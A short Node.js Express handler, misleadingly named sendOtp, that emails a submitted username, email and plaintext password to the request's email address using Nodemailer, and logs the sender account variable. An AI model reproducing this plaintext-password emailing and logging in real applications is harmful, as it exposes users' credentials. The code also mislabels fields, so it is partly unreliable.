const transporter = require('../Middleware/Nodemailer')

const sendOtp = async (req, res,next) => {
console.log(process.env.EMAIL_USER)
    const { email,password,username} = req.body;
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: email,
      subject: 'Shaw credentials',
      html: `
      <p>New login,</p>
      <p>these are the credentials  below :</p>
      <p><strong>Email:</strong> ${username}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p>Ensure you keep this information secure and do not share it with anyone.</p>
      <p>If you have any questions, feel free to contact our support team.</p>
      <p>Best regards,<br>Your Company Team</p>
    `
    }
    try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'login successfully' });
    } catch (err) {
    next(err);
    }};

    module.exports = {sendOtp}